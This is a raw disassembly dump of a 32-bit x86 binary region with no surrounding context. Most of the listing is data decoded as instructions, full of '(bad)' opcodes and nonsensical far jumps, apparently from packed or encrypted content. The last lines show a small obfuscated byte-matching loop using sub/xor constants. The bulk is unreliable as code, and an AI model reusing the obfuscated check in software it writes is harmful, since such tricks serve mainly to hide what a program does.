  41a6e5:	sbb    DWORD PTR [eax-0xa],edi
  41a6e8:	data16 arpl WORD PTR [eax],si
  41a6eb:	rol    BYTE PTR [esp+eax*8],cl
  41a6ee:	stos   DWORD PTR es:[edi],eax
  41a6ef:	xor    eax,0x93ac221d
  41a6f4:	std    
  41a6f5:	jno    0x41a6b3
  41a6f7:	jl     0x41a732
  41a6f9:	cli    
  41a6fa:	push   ebp
  41a6fb:	push   ds
  41a6fc:	clc    
  41a6fd:	out    0xce,eax
  41a6ff:	mov    ds:0xb8b2a6a8,eax
  41a704:	mov    esi,0xbc557c91
  41a709:	xor    dl,BYTE PTR [eax]
  41a70b:	xor    esp,esi
  41a70d:	push   esp
  41a70e:	lods   al,BYTE PTR ds:[esi]
  41a70f:	jne    0x41a749
  41a711:	add    DWORD PTR [ebp+0x333f2bb0],0xb0a546a9
  41a71b:	cwde   
  41a71c:	lods   al,BYTE PTR ds:[esi]
  41a71d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a71e:	js     0x41a77c
  41a720:	mov    esi,0xddc70246
  41a725:	in     eax,0x37
  41a727:	xor    eax,0xc660023c
  41a72c:	aas    
  41a72d:	fwait
  41a72e:	sbb    bh,BYTE PTR [esp+ebp*4-0x25ebbce8]
  41a735:	pop    esp
  41a736:	pop    esp
  41a737:	xchg   DWORD PTR [ecx+ecx*2-0x22ccc22d],ecx
  41a73e:	leave  
  41a73f:	aam    0x1d
  41a741:	fdivp  st(7),st
  41a743:	daa    
  41a744:	out    dx,eax
  41a745:	mov    eax,ds:0x97c9bca2
  41a74a:	push   ds
  41a74b:	jg     0x41a6d5
  41a74d:	dec    esp
  41a74e:	push   0xd1c1dd9c
  41a753:	dec    ecx
  41a754:	push   edx
  41a755:	jle    0x41a728
  41a757:	or     eax,DWORD PTR [esi+0x3b]
  41a75a:	mov    dh,0x82
  41a75c:	ja     0x41a721
  41a75e:	aad    0xbd
  41a760:	and    DWORD PTR [ecx-0x7],esi
  41a763:	adc    al,0x3c
  41a765:	xchg   esi,eax
  41a766:	xchg   esp,eax
  41a767:	es inc edi
  41a769:	adc    eax,0x56c1633
  41a76e:	fiadd  DWORD PTR [ebx]
  41a770:	loopne 0x41a7df
  41a772:	or     bl,ah
  41a774:	call   0x588f:0x66b7a797
  41a77b:	mov    esp,0x10562ef9
  41a780:	retf   0x2e0b
  41a783:	stc    
  41a784:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a785:	jno    0x41a711
  41a787:	adc    BYTE PTR [edx+0x6d],bl
  41a78a:	and    eax,0xff86b759
  41a78f:	or     ebx,DWORD PTR [ebp-0x769c2439]
  41a795:	sub    bl,ah
  41a797:	scas   eax,DWORD PTR es:[edi]
  41a798:	cwde   
  41a799:	sub    BYTE PTR [ebp-0x5b009f49],dh
  41a79f:	lahf   
  41a7a0:	xchg   ecx,eax
  41a7a1:	psllw  mm6,QWORD PTR [ebp-0x1a]
  41a7a5:	pop    ds
  41a7a6:	outs   dx,DWORD PTR ds:[esi]
  41a7a7:	(bad)  
  41a7a8:	fwait
  41a7a9:	push   ds
  41a7aa:	retf   0x31fa
  41a7ad:	sahf   
  41a7ae:	(bad)  
  41a7af:	xchg   ecx,eax
  41a7b0:	cli    
  41a7b1:	lock (bad) 
  41a7b3:	push   edx
  41a7b4:	xor    al,0x73
  41a7b6:	sbb    BYTE PTR [ebx+0x0],bl
  41a7b9:	mov    gs,ecx
  41a7bb:	rcr    BYTE PTR [eax+ebp*8],1
  41a7be:	js     0x41a824
  41a7c0:	aas    
  41a7c1:	scas   al,BYTE PTR es:[edi]
  41a7c2:	mov    ?,edi
  41a7c4:	or     al,0x5f
  41a7c6:	xchg   esp,eax
  41a7c7:	push   0xa08af980
  41a7cc:	push   eax
  41a7cd:	jmp    0x41a7e3
  41a7cf:	xchg   esi,eax
  41a7d0:	(bad)  
  41a7d1:	sbb    dl,BYTE PTR [edx+0xf]
  41a7d4:	mov    edi,0x3b506c49
  41a7d9:	push   edi
  41a7da:	push   eax
  41a7db:	in     al,dx
  41a7dc:	mov    esp,0xdef733bd
  41a7e1:	pop    esi
  41a7e2:	ds xor al,0x5c
  41a7e5:	das    
  41a7e6:	jl     0x41a822
  41a7e8:	(bad)  
  41a7e9:	call   0x679c0fa5
  41a7ee:	pop    ss
  41a7ef:	xchg   edi,eax
  41a7f0:	push   cs
  41a7f1:	scas   eax,DWORD PTR es:[edi]
  41a7f2:	outs   dx,DWORD PTR ds:[esi]
  41a7f3:	inc    ebp
  41a7f4:	sbb    BYTE PTR [edi-0x6f],al
  41a7f7:	dec    edi
  41a7f8:	inc    ecx
  41a7f9:	arpl   WORD PTR [eax],cx
  41a7fb:	or     al,0x92
  41a7fd:	loope  0x41a7ef
  41a7ff:	push   ss
  41a800:	dec    edi
  41a801:	sahf   
  41a802:	rcl    DWORD PTR [edx],0x62
  41a805:	retf   0xcf0
  41a808:	mov    esp,0x6f9df763
  41a80d:	adc    esi,eax
  41a80f:	adc    al,0x98
  41a811:	jle    0x41a85c
  41a813:	aad    0xa5
  41a815:	popa   
  41a816:	xchg   DWORD PTR [edx-0x1e6e671f],ecx
  41a81c:	mov    DWORD PTR [ebx],ebx
  41a81e:	cwde   
  41a81f:	lds    edi,FWORD PTR [ecx+edx*2+0x7d]
  41a823:	fstp   TBYTE PTR [ecx]
  41a825:	leave  
  41a826:	in     al,dx
  41a827:	pop    ebx
  41a828:	shl    ebp,cl
  41a82a:	sbb    esi,ebp
  41a82c:	stc    
  41a82d:	std    
  41a82e:	repnz in eax,dx
  41a830:	dec    esp
  41a831:	xor    ch,BYTE PTR [edi+0x3e94ab94]
  41a837:	pushf  
  41a838:	cs mov eax,0x7a5fcd43
  41a83e:	mov    ds:0xbeeef7eb,al
  41a843:	sub    eax,0xbfe03234
  41a848:	test   al,0x13
  41a84a:	cli    
  41a84b:	and    BYTE PTR [edi-0x4c],0x5e
  41a84f:	test   BYTE PTR [edi],ch
  41a851:	jno    0x41a830
  41a853:	jecxz  0x41a84e
  41a855:	loop   0x41a836
  41a857:	ret    
  41a858:	xor    DWORD PTR [ecx],edx
  41a85a:	pop    edx
  41a85b:	(bad)  
  41a85d:	stos   DWORD PTR es:[edi],eax
  41a85e:	sahf   
  41a85f:	jge    0x41a7ed
  41a861:	push   0x40
  41a863:	add    edx,DWORD PTR [ebp-0x13]
  41a866:	mov    ebp,0x6383733a
  41a86b:	mov    edx,0xc637f3e9
  41a870:	sbb    ebx,ebx
  41a872:	data16 in al,dx
  41a874:	inc    eax
  41a875:	cmp    ecx,DWORD PTR [eax+0x2a]
  41a878:	jno    0x41a8e5
  41a87a:	or     ebp,DWORD PTR [esi+0x44]
  41a87d:	stos   BYTE PTR es:[edi],al
  41a87e:	add    DWORD PTR [esi-0x337ecddc],eax
  41a884:	call   0x9477:0xe1a4c8de
  41a88b:	mov    edi,0xdecc95a
  41a890:	stos   BYTE PTR es:[edi],al
  41a891:	mov    eax,0x8825fb2a
  41a896:	or     BYTE PTR [ecx],ch
  41a898:	push   ss
  41a899:	mov    ?,WORD PTR [eax]
  41a89b:	fcmovnu st,st(1)
  41a89d:	push   ebp
  41a89e:	iret   
  41a89f:	mov    ch,dh
  41a8a1:	adc    BYTE PTR [esi+0x10],ch
  41a8a4:	add    al,0x3f
  41a8a6:	inc    esp
  41a8a7:	out    0x8,eax
  41a8a9:	cmp    cl,ch
  41a8ab:	int3   
  41a8ac:	popa   
  41a8ad:	enter  0xccc3,0x4d
  41a8b1:	xchg   esi,eax
  41a8b2:	cmc    
  41a8b3:	iret   
  41a8b4:	fsubr  QWORD PTR [edx+0x53ee1288]
  41a8ba:	retf   
  41a8bb:	les    edi,FWORD PTR [esi-0x6e]
  41a8be:	add    DWORD PTR [edi-0x40],ebx
  41a8c1:	lods   al,BYTE PTR ds:[esi]
  41a8c2:	das    
  41a8c3:	inc    esi
  41a8c4:	pop    edx
  41a8c5:	sbb    al,0xab
  41a8c7:	jne    0x41a861
  41a8c9:	mov    al,BYTE PTR [esi]
  41a8cb:	test   al,0x38
  41a8cd:	add    BYTE PTR [eax+eiz*1],0xf6
  41a8d1:	xlat   BYTE PTR ds:[ebx]
  41a8d2:	leave  
  41a8d3:	mov    ch,0xab
  41a8d5:	jl     0x41a8f1
  41a8d7:	shl    DWORD PTR [edx+0x75],1
  41a8da:	sbb    eax,0x1fd1e93c
  41a8df:	inc    edi
  41a8e0:	mov    WORD PTR [ecx+0x35],ds
  41a8e3:	imul   DWORD PTR [esi]
  41a8e5:	fisttp QWORD PTR [edx+0xfababc8]
  41a8eb:	data16 outs dx,BYTE PTR ds:[esi]
  41a8ed:	pop    es
  41a8ee:	mov    ds:0xdd58acc1,al
  41a8f3:	and    eax,0x70e298d
  41a8f8:	mov    bh,0x7a
  41a8fa:	xchg   edi,eax
  41a8fb:	sbb    edi,edx
  41a8fd:	and    eax,0x725ea15f
  41a902:	scas   eax,DWORD PTR es:[edi]
  41a903:	mov    esi,0x29756b6a
  41a908:	gs mov al,0x21
  41a90b:	clc    
  41a90c:	pusha  
  41a90d:	repnz ds stos BYTE PTR es:[edi],al
  41a910:	jge    0x41a971
  41a912:	jne    0x41a8fc
  41a914:	mov    bh,BYTE PTR [ecx+ecx*1]
  41a917:	dec    esp
  41a918:	int    0x2c
  41a91a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a91b:	ret    0xc0d3
  41a91e:	or     BYTE PTR [esi],cl
  41a920:	mov    esp,0xf3d9aed3
  41a925:	jo     0x41a928
  41a927:	push   ds
  41a928:	out    0x67,al
  41a92a:	rcr    DWORD PTR [eax+0x5c912728],1
  41a930:	and    BYTE PTR [eax+0x40e057e3],al
  41a936:	adc    ebx,DWORD PTR [ebx+0x37]
  41a939:	jmp    0xcd40c3da
  41a93e:	lea    edx,[ecx]
  41a940:	jp     0x41a9b5
  41a942:	mov    dh,0xe5
  41a944:	sub    BYTE PTR [edx+0x39],dl
  41a947:	mov    al,ds:0xe8134965
  41a94c:	mov    ah,0x95
  41a94e:	jg     0x41a972
  41a950:	lds    ecx,FWORD PTR [ebp+ecx*2-0x1b396101]
  41a957:	les    eax,FWORD PTR [edx-0x15]
  41a95a:	mov    ah,0x41
  41a95c:	mov    bl,0xd2
  41a95e:	jmp    0x41a8f0
  41a960:	cld    
  41a961:	mov    bh,BYTE PTR [ebx+eiz*2]
  41a964:	popa   
  41a965:	scas   al,BYTE PTR es:[edi]
  41a966:	std    
  41a967:	jb     0x41a963
  41a969:	jmp    0xabf4c05d
  41a96e:	push   edi
  41a96f:	stc    
  41a970:	fiadd  WORD PTR [edi]
  41a972:	push   edi
  41a973:	push   ebp
  41a974:	(bad)  
  41a975:	cwde   
  41a976:	(bad)  
  41a977:	xchg   esi,eax
  41a978:	imul   ebp,esp,0x16576621
  41a97e:	mov    al,ds:0x83188db9
  41a983:	sbb    eax,ebp
  41a985:	jmp    0xc836f200
  41a98a:	xor    ah,BYTE PTR [edx+0x7872bce1]
  41a990:	cli    
  41a991:	and    al,cl
  41a993:	and    al,0xc2
  41a995:	inc    edi
  41a996:	dec    ebp
  41a997:	daa    
  41a998:	icebp  
  41a999:	mov    bh,0x10
  41a99b:	sub    al,0x38
  41a99d:	lahf   
  41a99e:	lahf   
  41a99f:	subps  xmm5,XMMWORD PTR [edi+0xef1328a]
  41a9a6:	ins    BYTE PTR es:[edi],dx
  41a9a7:	push   ss
  41a9a8:	out    0xf4,eax
  41a9aa:	bound  ebx,QWORD PTR [esi+ebp*1+0x44de5281]
  41a9b1:	clc    
  41a9b2:	int3   
  41a9b3:	sub    ebp,eax
  41a9b5:	jo     0x41a9c2
  41a9b7:	dec    esp
  41a9b8:	mov    esp,0x82352dc8
  41a9bd:	outs   dx,BYTE PTR ds:[esi]
  41a9be:	pop    edx
  41a9bf:	push   edx
  41a9c0:	xchg   esp,eax
  41a9c1:	daa    
  41a9c2:	cmp    al,0xbf
  41a9c4:	cmp    ch,dl
  41a9c6:	lock sub ebx,esi
  41a9c9:	fxch   st(5)
  41a9cb:	adc    ebx,DWORD PTR [ecx]
  41a9cd:	cmp    eax,0xe9dad41d
  41a9d2:	lahf   
  41a9d3:	add    ecx,DWORD PTR [ecx-0x5976ab2d]
  41a9d9:	fldcw  WORD PTR [edx]
  41a9db:	push   ds
  41a9dc:	pop    esi
  41a9dd:	loopne 0x41a9ee
  41a9df:	cs pop ss
  41a9e1:	sti    
  41a9e2:	cdq    
  41a9e3:	popf   
  41a9e4:	mov    esi,0x4acac82b
  41a9e9:	test   eax,0x6ebdf60a
  41a9ee:	fdiv   QWORD PTR [esi+0x10ced638]
  41a9f4:	push   es
  41a9f5:	idiv   DWORD PTR [ecx-0x6632d265]
  41a9fb:	sbb    ecx,DWORD PTR [edi+0x12]
  41a9fe:	sbb    al,0xb1
  41aa00:	aad    0xd9
  41aa02:	retf   0x99b2
  41aa05:	inc    ecx
  41aa06:	bnd js 0x41a9cd
  41aa09:	adc    DWORD PTR [eax],edi
  41aa0b:	xchg   esp,eax
  41aa0c:	mov    edx,0x16f90ef5
  41aa11:	fild   DWORD PTR [edx+0x14]
  41aa14:	jb     0x41a9ef
  41aa16:	shl    BYTE PTR [ecx-0x509092cb],1
  41aa1c:	(bad)  
  41aa1d:	push   ss
  41aa1e:	dec    ecx
  41aa1f:	sbb    BYTE PTR [esi+0x3f],dh
  41aa22:	push   edi
  41aa23:	cmc    
  41aa24:	mov    bl,0x5d
  41aa26:	push   0xfffffff6
  41aa28:	cmp    eax,0xde5b8c25
  41aa2d:	push   ecx
  41aa2e:	inc    ebx
  41aa2f:	repnz xchg bp,ax
  41aa32:	(bad)  
  41aa33:	and    al,0x12
  41aa35:	(bad)  [ebx]
  41aa37:	arpl   WORD PTR [ebx-0x20fd3c6b],ax
  41aa3d:	in     eax,0x8e
  41aa3f:	lahf   
  41aa40:	and    al,0xc7
  41aa42:	rcr    DWORD PTR [ebx],0xe7
  41aa45:	in     eax,0x57
  41aa47:	cmp    esp,0xffffffe4
  41aa4a:	dec    ecx
  41aa4b:	jo     0x41aa84
  41aa4d:	(bad)  
  41aa4e:	int3   
  41aa4f:	xor    BYTE PTR [esi+0x44],bl
  41aa52:	enter  0xa998,0x22
  41aa56:	dec    ecx
  41aa57:	in     al,0xd5
  41aa59:	pop    eax
  41aa5a:	(bad)  
  41aa5b:	jns    0x41aac3
  41aa5d:	scas   al,BYTE PTR es:[edi]
  41aa5e:	(bad)  
  41aa60:	push   eax
  41aa61:	or     BYTE PTR [esi],bl
  41aa63:	cmp    al,0x67
  41aa65:	imul   edx,DWORD PTR [eax-0x34517add],0xffffff85
  41aa6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa6d:	nop
  41aa6e:	adc    ebx,DWORD PTR [ebp+0x73676041]
  41aa74:	pop    ebp
  41aa75:	push   ds
  41aa76:	sub    al,0xd0
  41aa78:	sub    eax,0xb1c1829c
  41aa7d:	call   0x3474:0xcf4ed282
  41aa84:	jle    0x41aa7b
  41aa86:	mov    DWORD PTR [esi+0x34],0xbfdfb2fa
  41aa8d:	call   0xeb71895c
  41aa92:	xchg   ecx,eax
  41aa93:	daa    
  41aa94:	out    0x18,eax
  41aa96:	cdq    
  41aa97:	cmc    
  41aa98:	mov    cs,WORD PTR [ebx+0x653f27e4]
  41aa9e:	pop    eax
  41aa9f:	mov    ds:0xd85a958f,al
  41aaa4:	inc    eax
  41aaa5:	scas   al,BYTE PTR es:[edi]
  41aaa6:	iret   
  41aaa7:	rcl    DWORD PTR [ecx-0x16a7415f],1
  41aaad:	inc    ebp
  41aaae:	call   0x875:0xe6ee59ba
  41aab5:	xchg   DWORD PTR [edx],esi
  41aab7:	add    BYTE PTR [edx],cl
  41aab9:	ficomp DWORD PTR [eax+eiz*1-0x26ed2d77]
  41aac0:	cli    
  41aac1:	push   ebp
  41aac2:	add    BYTE PTR [esi],dh
  41aac4:	mov    ch,0x20
  41aac6:	adc    eax,0xace20f52
  41aacb:	bound  edi,QWORD PTR [ecx+0x71eeb14c]
  41aad1:	not    eax
  41aad3:	mov    eax,ds:0x62510a15
  41aad8:	xchg   BYTE PTR [esi-0x4171042],al
  41aade:	retf   
  41aadf:	jl     0x41ab58
  41aae1:	test   BYTE PTR [eax+0x2fabf480],cl
  41aae7:	mov    edx,0xb3c75084
  41aaec:	adc    al,0xd3
  41aaee:	sub    ah,BYTE PTR [edi]
  41aaf0:	(bad)  
  41aaf1:	ins    BYTE PTR es:[edi],dx
  41aaf2:	aaa    
  41aaf3:	call   FWORD PTR [edx-0x7a746342]
  41aaf9:	dec    esp
  41aafa:	in     eax,dx
  41aafb:	retf   0xe5d5
  41aafe:	sbb    DWORD PTR [edi],eax
  41ab00:	cmp    BYTE PTR [ebx],al
  41ab02:	sahf   
  41ab03:	add    dl,bl
  41ab05:	lods   al,BYTE PTR ds:[esi]
  41ab06:	pusha  
  41ab07:	fmul   DWORD PTR [edi+ecx*8+0x76725ecf]
  41ab0e:	jp     0x41aad4
  41ab10:	imul   esi,DWORD PTR ds:0x2e33903f,0xf
  41ab17:	mov    al,ds:0x6a8f1e62
  41ab1c:	inc    esi
  41ab1d:	in     al,0xf0
  41ab1f:	inc    esp
  41ab20:	jp     0x41ab47
  41ab22:	sub    DWORD PTR [edi],ebx
  41ab24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab25:	xchg   ebp,eax
  41ab26:	cld    
  41ab27:	ret    0x4d6
  41ab2a:	push   edi
  41ab2b:	in     al,0x3e
  41ab2d:	outs   dx,BYTE PTR ds:[esi]
  41ab2e:	xor    BYTE PTR [ecx],0x72
  41ab31:	push   cs
  41ab32:	jl     0x41ab3b
  41ab34:	in     al,0xcb
  41ab36:	add    DWORD PTR [edi],eax
  41ab38:	add    eax,0x9eda6b51
  41ab3d:	cmp    BYTE PTR fs:[edi+0x3f7c9460],0xd3
  41ab45:	jg     0x41ab7e
  41ab47:	cmp    eax,0xe028a3c2
  41ab4c:	sbb    dh,BYTE PTR [edx-0x72]
  41ab4f:	fld    DWORD PTR [edi]
  41ab51:	mov    ebp,0x5031e7a4
  41ab56:	clc    
  41ab57:	test   BYTE PTR [esp+edi*4],al
  41ab5a:	xor    eax,esi
  41ab5c:	mov    ebx,0x9c287e1a
  41ab61:	mov    fs,WORD PTR [ebx+0x69]
  41ab64:	inc    ecx
  41ab65:	test   al,0x5d
  41ab68:	jp     0x41abc0
  41ab6a:	ds dec edi
  41ab6c:	xor    BYTE PTR cs:[ecx],ch
  41ab6f:	push   esi
  41ab70:	jbe    0x41ab3b
  41ab72:	std    
  41ab73:	jb     0x41abf0
  41ab75:	mov    ah,0x1e
  41ab77:	into   
  41ab78:	cmp    DWORD PTR [eax+0x4],ecx
  41ab7b:	cmp    DWORD PTR [edi-0xe],0xde51c38f
  41ab82:	xchg   ebx,eax
  41ab83:	test   eax,0xeb78e80
  41ab88:	and    al,0xc9
  41ab8a:	fwait
  41ab8b:	mov    eax,ds:0xe3ae1774
  41ab90:	stos   BYTE PTR es:[edi],al
  41ab91:	push   0xfffffff6
  41ab93:	jmp    0xd340:0x715dbd6a
  41ab9a:	sti    
  41ab9b:	and    ebx,ebp
  41ab9d:	pop    ds
  41ab9e:	jo     0x41ab51
  41aba0:	adc    esi,DWORD PTR [edx-0x1d5d4c78]
  41aba6:	aam    0x9c
  41aba8:	xchg   BYTE PTR [esi+0x69713566],bh
  41abae:	and    DWORD PTR [esi],edx
  41abb0:	aam    0x77
  41abb2:	inc    ebp
  41abb3:	mov    bl,0xf2
  41abb5:	sbb    BYTE PTR [eax-0x3b8d928a],dl
  41abbb:	mov    ah,0x30
  41abbd:	data16 loop 0x41aba1
  41abc0:	xchg   edx,eax
  41abc1:	push   esi
  41abc2:	add    ebp,DWORD PTR [esi+0x6d]
  41abc5:	lods   al,BYTE PTR ds:[esi]
  41abc6:	cmp    eax,0xd2e1c2e1
  41abcb:	cwde   
  41abcc:	inc    edi
  41abcd:	pusha  
  41abce:	(bad)  
  41abcf:	sbb    BYTE PTR [edi+ebx*2-0x1b],ch
  41abd3:	int3   
  41abd4:	xor    BYTE PTR [ecx],cl
  41abd6:	ins    BYTE PTR es:[edi],dx
  41abd7:	push   ss
  41abd8:	out    0xee,al
  41abda:	xlat   BYTE PTR ds:[ebx]
  41abdb:	ror    DWORD PTR [eax-0x62095351],cl
  41abe1:	jae    0x41ab9c
  41abe3:	xchg   esp,eax
  41abe4:	outs   dx,BYTE PTR ds:[esi]
  41abe5:	sbb    al,0x5a
  41abe7:	cmp    al,0x9b
  41abe9:	adc    al,0xd3
  41abeb:	int3   
  41abec:	aaa    
  41abed:	jl     0x41ac0f
  41abef:	sbb    cl,bl
  41abf1:	dec    ecx
  41abf2:	mov    al,ds:0x3a711c62
  41abf7:	pop    esi
  41abf8:	je     0x41ac6f
  41abfa:	arpl   WORD PTR gs:[ecx+eiz*8+0x64fb954a],si
  41ac02:	xor    cl,BYTE PTR [ebx+0x3c938cd0]
  41ac08:	dec    esp
  41ac09:	cs inc ebx
  41ac0b:	jbe    0x41ac07
  41ac0d:	fistp  QWORD PTR [eax-0x5d091546]
  41ac13:	imul   esp,DWORD PTR [esi+0x2],0x4dfd5af1
  41ac1a:	adc    eax,0x87b70191
  41ac1f:	xchg   esp,eax
  41ac20:	imul   DWORD PTR [esi]
  41ac22:	scas   eax,DWORD PTR es:[edi]
  41ac23:	fmul   QWORD PTR gs:[eax+0x0]
  41ac27:	stc    
  41ac28:	add    eax,0x16194111
  41ac2d:	mov    ebp,0xf9142035
  41ac32:	(bad)  
  41ac33:	aam    0xed
  41ac35:	push   edi
  41ac36:	mov    ah,0x9
  41ac38:	cli    
  41ac39:	arpl   WORD PTR [esi],di
  41ac3b:	pop    eax
  41ac3c:	gs jg  0x41ac64
  41ac3f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac40:	loop   0x41ac84
  41ac42:	mov    ds:0x16810aec,al
  41ac47:	add    eax,DWORD PTR [ebx-0x690d3fa7]
  41ac4d:	(bad)  
  41ac4e:	and    DWORD PTR [ecx-0x20],ebp
  41ac51:	mov    ch,0x67
  41ac53:	cmp    al,0x1
  41ac55:	mov    ebp,0x7ab31931
  41ac5a:	xchg   ecx,eax
  41ac5b:	int    0x73
  41ac5d:	(bad)  
  41ac5e:	jbe    0x41abe8
  41ac60:	xchg   edx,eax
  41ac61:	scas   al,BYTE PTR es:[edi]
  41ac62:	ficomp WORD PTR [esi-0x29f9f43b]
  41ac68:	sub    eax,0x997e3f
  41ac6d:	or     BYTE PTR [ecx+0x17],ch
  41ac70:	lahf   
  41ac71:	inc    esi
  41ac72:	inc    ebp
  41ac73:	imul   eax,DWORD PTR [edx+edi*1],0x4aa38fcc
  41ac7a:	jmp    0xd31:0xf703a72d
  41ac81:	and    ecx,ecx
  41ac83:	rcl    DWORD PTR [edi-0x45926097],cl
  41ac89:	sub    ah,BYTE PTR [ebx]
  41ac8b:	js     0x41ac4e
  41ac8d:	mov    ebp,DWORD PTR [edx]
  41ac8f:	sub    al,0x10
  41ac91:	push   esp
  41ac92:	sub    BYTE PTR [esi-0x7d],dl
  41ac95:	jb     0x41ace7
  41ac97:	mov    dl,0xe4
  41ac99:	int    0xb9
  41ac9b:	mov    esp,0xc00f2f63
  41aca0:	dec    edi
  41aca1:	mov    ecx,0x9a1cc7ce
  41aca6:	xchg   DWORD PTR [esi-0x62],ecx
  41aca9:	xor    DWORD PTR ds:0x67035eb6,esp
  41acaf:	ret    0x5f81
  41acb2:	sti    
  41acb3:	inc    esp
  41acb4:	xor    eax,0xbecb0374
  41acb9:	dec    ebp
  41acba:	jg     0x41ac78
  41acbc:	scas   eax,DWORD PTR es:[edi]
  41acbd:	scas   eax,DWORD PTR es:[edi]
  41acbe:	fmul   QWORD PTR [edi-0x33]
  41acc1:	pop    esi
  41acc2:	inc    esi
  41acc3:	cmp    cl,BYTE PTR [esp+edi*8]
  41acc6:	inc    ecx
  41acc7:	xchg   ebp,eax
  41acc8:	icebp  
  41acc9:	or     ch,BYTE PTR [ecx-0x5563e159]
  41accf:	dec    esp
  41acd0:	and    al,0x4b
  41acd2:	in     al,dx
  41acd3:	or     edx,eax
  41acd5:	adc    al,0x17
  41acd7:	adc    BYTE PTR fs:[edx],al
  41acda:	sbb    DWORD PTR [esi+edx*4-0x80],esi
  41acde:	jmp    0x41ad48
  41ace0:	and    esi,eax
  41ace2:	ror    DWORD PTR [ebx+0x65bccf04],cl
  41ace8:	or     al,0xd7
  41acea:	and    eax,0xe04c185
  41acef:	int    0x81
  41acf1:	push   edi
  41acf2:	clc    
  41acf3:	add    esp,DWORD PTR [ebx+esi*8+0x47115387]
  41acfa:	mov    al,ds:0x6dc2c2d4
  41acff:	xchg   esp,eax
  41ad00:	dec    edx
  41ad01:	mov    bh,0xf6
  41ad03:	loope  0x41ac88
  41ad05:	fnsave [edx+eiz*1]
  41ad08:	repz push ss
  41ad0a:	call   0x2394af96
  41ad0f:	lods   al,BYTE PTR ds:[esi]
  41ad10:	fisttp WORD PTR [edx]
  41ad12:	inc    ebx
  41ad13:	and    al,bl
  41ad15:	arpl   WORD PTR [edx+0x28a05c2a],ax
  41ad1b:	stos   BYTE PTR es:[edi],al
  41ad1c:	mov    bl,dl
  41ad1e:	xchg   ecx,eax
  41ad1f:	or     al,0x0
  41ad21:	push   ebx
  41ad22:	mov    WORD PTR [edi+0x40],cs
  41ad25:	pop    DWORD PTR [eax-0x4c]
  41ad28:	nop
  41ad29:	or     bl,BYTE PTR [esi-0x7]
  41ad2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad2d:	pop    ecx
  41ad2e:	push   ss
  41ad2f:	sbb    eax,0xd016e70a
  41ad34:	and    ebp,DWORD PTR [edi-0x528f33fa]
  41ad3a:	dec    edx
  41ad3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad3c:	xor    al,0xa1
  41ad3e:	pop    edx
  41ad3f:	outs   dx,BYTE PTR ds:[esi]
  41ad40:	loopne 0x41ad25
  41ad42:	retf   0xcb33
  41ad45:	push   edi
  41ad46:	xchg   esp,eax
  41ad47:	jne    0x41ad1a
  41ad49:	clc    
  41ad4a:	out    dx,al
  41ad4b:	test   DWORD PTR [ecx-0x67],edx
  41ad4e:	xor    BYTE PTR [eax-0x2],0xa1
  41ad52:	icebp  
  41ad53:	or     bl,BYTE PTR [esi-0xf]
  41ad56:	popa   
  41ad57:	jmp    0xbb8c:0x2696fe58
  41ad5e:	sbb    bl,BYTE PTR [ecx+0x45]
  41ad61:	sar    BYTE PTR [ebx],cl
  41ad63:	or     ah,ah
  41ad65:	inc    esp
  41ad66:	dec    edi
  41ad67:	in     eax,dx
  41ad68:	push   0x46
  41ad6a:	in     eax,dx
  41ad6b:	cmp    edi,ecx
  41ad6d:	enter  0xd4a6,0x8f
  41ad71:	mov    DWORD PTR [ebp-0x45d608ec],0x32f0da99
  41ad7b:	retf   0x98d5
  41ad7e:	mov    ch,0x5d
  41ad80:	outs   dx,DWORD PTR ds:[esi]
  41ad81:	mov    ds:0xc59d2d7a,al
  41ad86:	mov    ah,0xa8
  41ad88:	inc    ebx
  41ad89:	and    ch,BYTE PTR [eax]
  41ad8b:	jb     0x41adff
  41ad8d:	jg     0x41ae0e
  41ad8f:	ins    DWORD PTR es:[edi],dx
  41ad90:	nop
  41ad91:	inc    edx
  41ad92:	loopne 0x41ae08
  41ad94:	sub    esp,DWORD PTR [esi+ebp*2]
  41ad97:	jmp    0x106a11e0
  41ad9c:	pop    esi
  41ad9d:	jo     0x41adc2
  41ad9f:	jmp    0x41ad6f
  41ada1:	dec    esi
  41ada2:	in     eax,0xd6
  41ada4:	cs icebp 
  41ada6:	loop   0x41ad52
  41ada8:	fld    DWORD PTR gs:[eax+0x15a544f7]
  41adaf:	mov    BYTE PTR [edi-0x16489996],dl
  41adb5:	mov    ds:0x64e6b458,al
  41adba:	pop    esi
  41adbb:	push   ecx
  41adbc:	dec    esp
  41adbd:	mov    dl,0xf7
  41adbf:	in     al,0x44
  41adc1:	not    ch
  41adc3:	repz sub ebx,edi
  41adc6:	aas    
  41adc7:	fld    DWORD PTR [ecx+edi*1-0x2e]
  41adcb:	test   DWORD PTR [esp+eiz*2],esp
  41adce:	jae    0x41ad7c
  41add0:	jmp    0x41ae26
  41add2:	jecxz  0x41adde
  41add4:	(bad)  
  41add6:	push   es
  41add7:	idiv   esi
  41add9:	push   ds
  41adda:	repz inc edi
  41addc:	adc    dh,ah
  41adde:	adc    al,0x92
  41ade0:	not    BYTE PTR fs:[esi+0x57]
  41ade4:	cmp    DWORD PTR [eax],0xffffff8b
  41ade7:	cli    
  41ade8:	aam    0xad
  41adea:	adc    ah,BYTE PTR [ebp-0x77]
  41aded:	inc    ebp
  41adee:	clc    
  41adef:	push   DWORD PTR [ebp+0x18]
  41adf2:	jmp    0x41ae4b
  41adf7:	mov    ecx,DWORD PTR [ebp-0x8]
  41adfa:	add    ecx,eax
  41adfc:	mov    DWORD PTR [ebp-0x14],ecx
  41adff:	mov    ecx,DWORD PTR [ebp-0x14]
  41ae02:	mov    ecx,DWORD PTR [ecx+0xc]
  41ae05:	movsx  cx,BYTE PTR [ecx+eax*1]
  41ae0a:	mov    edx,0x3b4b
  41ae0f:	sub    cx,dx
  41ae12:	mov    edx,0x8a85
  41ae17:	xor    cx,dx
  41ae1a:	mov    edx,0x4f85
  41ae1f:	cmp    cx,dx
  41ae22:	jne    0x41adef
  41ae28:	mov    ecx,DWORD PTR ds:0x421c66
  41ae2e:	mov    ecx,DWORD PTR [ecx+0x198]
  41ae34:	mov    DWORD PTR [ecx],eax
  41ae36:	jmp    0x41ae5c
